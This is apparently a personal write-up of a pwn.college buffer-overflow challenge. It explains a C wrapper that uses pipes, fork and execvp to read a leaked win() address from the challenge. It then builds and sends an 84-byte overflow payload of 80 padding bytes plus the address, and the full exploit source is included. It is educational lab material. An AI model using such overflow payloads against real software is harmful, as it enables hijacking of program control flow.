Introduction

This write-up documents my solution to the remember-this challenge from pwn.college.

This write-up documents my solution to the remember-this challenge from pwn.college. The main problem was that the challenge program prints a runtime leaked address and then waits for input. The payload I needed to send had to contain this leaked address in binary form, so manually copying and converting the address was not the approach I wanted.

To solve this, I wrote a C parent program that automatically controls the challenge program. The parent creates two Linux pipes and uses fork() and execvp() to start the challenge as a child process. One pipe captures the challenge's stdout, while the second pipe sends the final payload back to the challenge's stdin.

The parent first reads the challenge output, extracts the leaked address using strtoul(), and converts the hexadecimal string into an integer. It then constructs an 84-byte payload containing 80 A bytes followed by the 4-byte leaked address. Finally, it sends those raw bytes through the second pipe to the challenge. I could have written a Python script to automate the same interaction, but I chose C because the main purpose of this exercise was to understand the Linux process and system-programming side of the problem. By implementing it in C, I had to directly work with pipe(), fork(), dup2(), execvp(), read(), write(), and wait(). This helped me understand how processes communicate through file descriptors, how standard input/output can be redirected, and how a parent process can control and exchange data with a child process.

1. Understanding the Challenge

The challenge program is: 

/challenge/remember-this

The basic behavior of the challenge can be represented as:

  |
  v

  |
  v

  |
  v

  |
  v

The important output looks similar to: 

[LEAK] win: 0x6298930d

The interesting part is the hexadecimal address: 

0x6298930d

Because this is a 32-bit challenge, the address occupies: 

32 bits
   |
   v
4 bytes

The payload expected by the vulnerable program has the following general structure: 

80 bytes of padding
        +

        =

The purpose of my wrapper is to obtain the target address dynamically and construct this input automatically.

2. Why Create a Wrapper Program?

The simplest way to interact with the challenge would be to run the program manually, read the leaked address, construct the input, and provide it through stdin.

However, I wanted to automate the entire process.

The wrapper therefore needs to perform several operations:

  • Start the challenge program.
  • Capture the challenge's stdout.
  • Store the output in a buffer.
  • Extract the leaked address.
  • Convert the address from a string into a numeric value.
  • Construct the binary payload.
  • Send the payload to the challenge's stdin.
  • Read the final output from the challenge.

The complete communication model is: 

challenge stdout
       |
       v
      pipe
       |
       v
    parent
       |
       | parse leak
       |
       | construct payload
       v
      pipe
       |
       v
challenge stdin

Since communication is required in both directions, I use two pipes.

3. Creating the Pipes

The first part of the program creates two pipe arrays: 

int fd[2];
int dd[2];

Then: 

if(pipe(fd) == -1)
{
    perror("pipe error");
    return 1;
}

if(pipe(dd) == -1)
{
    perror("pipe2 is error");
    return 1;
}

The important rule for a Linux pipe is: 

pipe[0] = read end
pipe[1] = write end

Therefore: 

fd[0] = read end of pipe 1
fd[1] = write end of pipe 1

dd[0] = read end of pipe 2
dd[1] = write end of pipe 2

I use the first pipe for: 

challenge stdout
      |
      v
     fd[1]
      |
     pipe
      |
      v
     fd[0]
      |
      v
    parent

The second pipe is used for: 

parent
   |
   v
 dd[1]
   |
  pipe
   |
   v
 dd[0]
   |
   v
challenge stdin

So the direction of communication is: 

PIPE 1:

challenge  ---->  parent


PIPE 2:

parent  ---->  challenge

4. Creating the Parent and Child

After creating the pipes, I use: 

pid_t pid = fork();

The fork creates a second process. 

                  fork()
                    |
          +---------+---------+
          |                   |
        child               parent

The child will become the challenge program.

The parent will control the communication.

The return value of fork() tells us which process we are in. 

pid == 0
    |
    v
child process


pid > 0
    |
    v
parent process


pid < 0
    |
    v
fork failed

5. Child Process

The child process enters: 

if(pid == 0)
{
    ...
}

The first thing I need to do is configure the child's standard output and standard input.

The reason is that I do not want the challenge's stdout to directly go to my terminal. I want the parent process to receive it.

6. Redirecting stdout

The child first closes: 

close(fd[0]);

The child does not need the read side of the first pipe.

The child needs to write its stdout into the pipe.

This is done using: 

dup2(fd[1], STDOUT_FILENO);

On Linux: 

STDOUT_FILENO = 1

Normally, when a program executes: 

printf("hello");

the data goes through file descriptor 1: 

printf()
   |
   v
STDOUT_FILENO
   |
   v
terminal

After: 

dup2(fd[1], STDOUT_FILENO);

the path becomes: 

printf()
   |
   v
STDOUT_FILENO
   |
   v
fd[1]
   |
   v
pipe
   |
   v
fd[0]
   |
   v
parent

This means the challenge's stdout has been redirected into the pipe.

After the redirection: 

close(fd[1]);

is performed because stdout already refers to the pipe.

7. Redirecting stdin

The second pipe is used in the opposite direction.

The child closes the write side: 

close(dd[1]);

Then: 

dup2(dd[0], STDIN_FILENO);

On Linux: 

STDIN_FILENO = 0

Normally: 

challenge
    |
    v
STDIN_FILENO
    |
    v
keyboard / terminal

After the redirection: 

parent
   |
   v
dd[1]
   |
  pipe
   |
   v
dd[0]
   |
   v
STDIN_FILENO
   |
   v
challenge

Therefore, whenever the challenge reads from stdin, the data can come from the parent process.

The child then closes: 

close(dd[0]);

because stdin already refers to that pipe.

8. Executing the Challenge

After configuring stdin and stdout, the child executes the challenge.

My code uses: 

char *const argv[] = {
    "stdbuf",
    "-o0",
    "/challenge/remember-this",
    NULL
};

execvp("stdbuf", argv);

This effectively executes: 

stdbuf -o0 /challenge/remember-this

The -o0 option requests unbuffered stdout.

This is useful because the parent needs to receive the challenge's output while the challenge is still running.

The final child process therefore looks like: 

child
  |
  v
stdbuf
  |
  v
/challenge/remember-this

The important point is that the stdin and stdout redirections created before execvp() remain available to the executed program.

10. Reading the Leaked Output

The parent creates: 

char buffer[100];

Then reads from the first pipe: 

ssize_t n = read(
    fd[0],
    buffer,
    sizeof(buffer) - 1
);

Since: 

sizeof(buffer) = 100

the requested read size is: 

100 - 1 = 99 bytes

After reading, I manually add a null terminator: 

buffer[n] = '\0';

This is important because read() does not automatically append a null byte.

The data flow is: 

challenge
    |
    | stdout
    v
fd[1]
    |
    v
pipe
    |
    v
fd[0]
    |
    v
buffer

11. The Leaked Address

The challenge produces output similar to: 

[LEAK] win: 0x6298930d

The prefix: 

[LEAK] win:

contains 12 bytes when the trailing space is included.

Therefore I use: 

int offset = 12;

Conceptually: 

[LEAK] win: 0x6298930d
<---12--> <-------->
 prefix      address

The purpose of the offset is to separate the textual prefix from the actual leaked address.

12. Extracting the Prefix

I copy the first 12 bytes into another buffer: 

memcpy(offset_buf, buffer, offset);

Then I terminate it: 

offset_buf[offset] = '\0';

The result is: 

offset_buf

"[LEAK] win: "

There is an important C detail here.

Because I copy 12 bytes and also need one byte for the terminating \0, the buffer should have room for at least 13 bytes: 

char offset_buf[13];

A smaller declaration such as: 

char offset_buf[11];

would not have enough space for this operation.

13. Extracting the Address

Next I calculate how many bytes remain after the prefix: 

int remaining = n - offset;

Then: 

memcpy(
    remaining_buf,
    buffer + offset,
    remaining
);

The pointer: 

buffer + offset

means: 

start at buffer
      |
      +---- move forward 12 bytes

So the data after the prefix is copied into remaining_buf.

Finally: 

remaining_buf[remaining] = '\0';

The resulting string is: 

0x6298930d

At this point the address is still text.

14. Converting the Address with strtoul()

The leaked address needs to become a numeric value.

I use: 

unsigned int addr =
    (unsigned int)strtoul(
        remaining_buf,
        NULL,
        0
    );

Suppose: 

remaining_buf = "0x6298930d"

Then strtoul() converts the string into a numeric value: 

"0x6298930d"
      |
      v
   strtoul()
      |
      v
0x6298930d

The last argument is: 

0

Using base 0 tells strtoul() to determine the base from the string prefix.

For example: 

1234       - decimal

0x1234     - hexadecimal

01234      - octal

Therefore the hexadecimal leak can be converted without manually specifying base 16.

15. Understanding the 32-bit Address

The challenge uses a 32-bit address. 

32 bits
  |
  v
4 bytes

For example: 

0x6298930d

can be separated into: 

62 98 93 0d

That is four bytes.

However, the machine uses little-endian byte order.

Therefore, the memory representation is: 

0d 93 98 62

This matters because the payload contains the raw address bytes rather than the ASCII characters: 

"0x6298930d"

16. Constructing the Payload

The next step is to create the input that will be sent to the challenge.

I allocate: 

unsigned char test_buf[84];

The layout is: 

test_buf

0                                      79 80          83
|---------------------------------------|--------------|
|              80 x 'A'                | 4-byte addr  |
|---------------------------------------|--------------|

              80 bytes                    4 bytes

                         80 + 4 = 84

The first 80 bytes are padding.

The final 4 bytes contain the target address.

17. Filling the Padding with memset()

I use: 

memset(test_buf, 'A', 80);

This writes the character A into the first 80 bytes.

ASCII: 

'A' = 0x41

Therefore the first part of the payload looks like: 

41 41 41 41 41 41 41 41 ...

or, when viewed as text: 

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

The important part is that there are exactly 80 bytes before the address.

18. Copying the Address into the Payload

After creating the padding, I place the address at byte offset 80: 

memcpy(test_buf + 80, &addr, 4);

The expression: 

test_buf + 80

points to the 81st byte of the array, because array indexing starts from zero.

The final layout is: 

offset

0                                      79 80          83
|---------------------------------------|--------------|
|             'A' x 80                  | address      |
|---------------------------------------|--------------|

This creates an 84-byte binary payload.

19. Inspecting the Payload

To debug the payload, I print each byte in hexadecimal: 

for(int i = 0; i < 84; i++)
    printf("%02x", test_buf[i]);

printf("\n");

This is useful because the payload contains raw binary data.

For example: 

414141414141414141414141...

represents: 

41 41 41 41 41 41 ...

and: 

41

is the ASCII representation of: 

'A'

Printing the buffer as hexadecimal makes it easier to verify the exact number and position of bytes.

20. Sending the Payload

Once the payload is constructed, I send it through the second pipe: 

write(dd[1], test_buf, sizeof(test_buf));

Because: 

sizeof(test_buf) = 84

the intended payload size is: 

84 bytes

The complete data flow is: 

test_buf
   |
   v
write(dd[1], test_buf, 84)
   |
   v
dd[1]
   |
   v
pipe
   |
   v
dd[0]
   |
   v
STDIN_FILENO
   |
   v
challenge

One important thing I learned here is that write() does not mean "print this to my terminal".

It writes bytes to the file descriptor supplied to it.

Because dd[1] represents the pipe connected to the challenge's stdin, the bytes go to the challenge.

21. Closing the Input Pipe

After sending the payload, I close: 

close(dd[1]);

The correct order is: 

write()
  |
  v
close()

not: 

close()
  |
  v
write()

Closing the write side after the payload has been sent also allows the child to observe EOF if it performs a read that waits for the end of input.

22. The Deadlock Problem

One of the most important problems I encountered was a pipe deadlock.

My first thought was to continuously read from the challenge: 

while((n = read(fd[0], buffer, sizeof(buffer))) > 0)
{
    ...
}

But the challenge does not necessarily close stdout after printing the leak.

Instead, its behavior is approximately: 

challenge
    |
    v
print leak
    |
    v
wait for stdin

At the same time, the parent can end up doing: 

parent
   |
   v
read stdout
   |
   v
wait for more data

Now both processes can wait for each other: 

Parent:
"I am waiting for more stdout."

        <---------------->

Challenge:
"I am waiting for stdin."

This is a deadlock.

The important lesson was that a pipe is a synchronization mechanism as well as a communication mechanism.

For this challenge, I needed to read the available output, process the leak, and send the required input instead of waiting indefinitely for stdout EOF.

23. Reading the Remaining Output

After sending the payload, the challenge can produce additional output.

I read that output using: 

char loosu[1000];
ssize_t m;

while((m = read(fd[0], loosu, sizeof(loosu) - 1)) > 0)
{
    loosu[m] = '\0';
    printf("%s", loosu);
}

The purpose of this loop is to continue receiving output from the challenge after the payload has been sent.

The communication path is: 

challenge
    |
    | stdout
    v
fd[1]
    |
    v
pipe
    |
    v
fd[0]
    |
    v
loosu
    |
    v
printf()
    |
    v
terminal

When read() returns zero, it means the pipe reached EOF.

24. Waiting for the Child

At the end of the parent process I use: 

wait(NULL);

The parent waits for the child process to finish.

25. Complete Wrapper Source Code

The following is the wrapper program used for the challenge: 

#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/wait.h>
#include <stdlib.h>

int main()
{
    int fd[2];
    int dd[2];

    char buffer[100];
    char calculated_data[] = "brijeshzzzz";

    if(pipe(fd) == -1)
    {
        perror("pipe error");
        return 1;
    }

    if(pipe(dd) == -1)
    {
        perror("pipe2 is error");
        return 1;
    }

    pid_t pid = fork();

    if(pid == 0)
    {
        /* child process */

        close(fd[0]);

        dup2(fd[1], STDOUT_FILENO);
        close(fd[1]);

        close(dd[1]);

        dup2(dd[0], STDIN_FILENO);
        close(dd[0]);

        char *const argv[] = {
            "stdbuf",
            "-o0",
            "/challenge/remember-this",
            NULL
        };

        execvp("stdbuf", argv);

        perror("execvp");

        return 0;
    }

    else if(pid > 0)
    {
        /* parent process */

        close(dd[0]);
        close(fd[1]);

        char buffer[100];
        char offset_buf[13];
        char remaining_buf[1000];

        ssize_t n =
            read(fd[0], buffer, sizeof(buffer) - 1);

        if(n > 0)
        {
            buffer[n] = '\0';

            int offset = 12;

            /*
             * Extract the prefix.
             */

            memcpy(
                offset_buf,
                buffer,
                offset
            );

            offset_buf[offset] = '\0';

            /*
             * Extract the leaked address.
             */

            int remaining = n - offset;

            memcpy(
                remaining_buf,
                buffer + offset,
                remaining
            );

            remaining_buf[remaining] = '\0';

            printf(
                "Offset part: %s\n",
                offset_buf
            );

            printf(
                "Remaining: %s\n",
                remaining_buf
            );

            /*
             * Convert the leaked hexadecimal
             * string into an integer.
             */

            unsigned int addr =
                (unsigned int)strtoul(
                    remaining_buf,
                    NULL,
                    0
                );

            /*
             * Build the payload.
             */

            unsigned char test_buf[84];

            memset(
                test_buf,
                'A',
                80
            );

            memcpy(
                test_buf + 80,
                &addr,
                4
            );

            /*
             * Print the payload as hexadecimal.
             */

            for(int i = 0; i < 84; i++)
                printf(
                    "%02x",
                    test_buf[i]
                );

            printf("\n");

            /*
             * Send the complete payload
             * to the challenge stdin.
             */

            write(
                dd[1],
                test_buf,
                sizeof(test_buf)
            );

            close(dd[1]);

            printf(
                "[child PID %d] after the execution "
                "of the challenge the stdout of the "
                "challenge program will be read and "
                "stored in the buffer and calculate "
                "the offset of the stdin and only get "
                "the leak address\n",
                getpid()
            );
        }

        /*
         * Read the remaining challenge output.
         */

        char loosu[1000];
        ssize_t m;

        while(
            (m = read(
                fd[0],
                loosu,
                sizeof(loosu) - 1
            )) > 0
        )
        {
            loosu[m] = '\0';
            printf("%s", loosu);
        }

        if(n == 0)
        {
            printf(
                "\n[child] Got EOF - "
                "parent closed write end\n"
            );
        }

        printf(
            "printf the parent pid %d",
            getpid()
        );

        printf("\nchild RIP\n");

        close(fd[0]);

        wait(NULL);
    }

    else
    {
        perror("fork RIP");
        return 1;
    }

    return 0;
}

29. Important Difference Between read() and a C String

One thing that became clear during this challenge is that Linux read() operates on bytes, not C strings.

For example: 

ssize_t n = read(
    fd[0],
    buffer,
    sizeof(buffer) - 1
);

After this operation, there is no automatic: 

'\0'

Therefore I explicitly use: 

buffer[n] = '\0';

Only after doing this can the buffer safely be used with functions such as: 

printf("%s", buffer);

This distinction is important when working with pipes and binary payloads.

30. Why the Payload Uses unsigned char

The payload is declared as: 

unsigned char test_buf[84];

This is useful because the payload is fundamentally a collection of bytes.

It is not necessarily a normal C string.

For example, the address can contain bytes that are not printable characters.

Therefore: 

unsigned char

is a better representation for raw byte data than treating the entire payload as a normal string.

31. Why sizeof(test_buf) Is Used

The final write operation is: 

write(
    dd[1],
    test_buf,
    sizeof(test_buf)
);

The buffer was declared as: 

unsigned char test_buf[84];

Therefore: 

sizeof(test_buf)
        |
        v
       84

This sends all 84 bytes.

This is different from: 

write(dd[1], buffer, n);

because n represents the number of bytes returned by the previous read().

It does not represent the size of the new payload.

34. Conclusion

The main lesson from this challenge was that the buffer overflow itself was only one part of the problem.

The interesting part was building the complete communication mechanism around the challenge.

The final solution combines process creation, file descriptors, pipes, stdin/stdout redirection, runtime leak parsing, integer conversion, byte-level buffer construction, and process synchronization.

What initially looked like several separate Linux concepts turned out to be one connected workflow.

The pipes provide communication, fork() creates the two processes, dup2() connects the pipes to stdin and stdout, execvp() starts the challenge, read() retrieves the leak, strtoul() converts the address, memset() and memcpy() construct the payload, and write() sends the final bytes back to the challenge.

The important part was not simply creating an overflow payload. The real exercise was understanding how a parent process can dynamically communicate with another process, obtain runtime information, transform that information into raw bytes, and feed the resulting binary data back into the program.
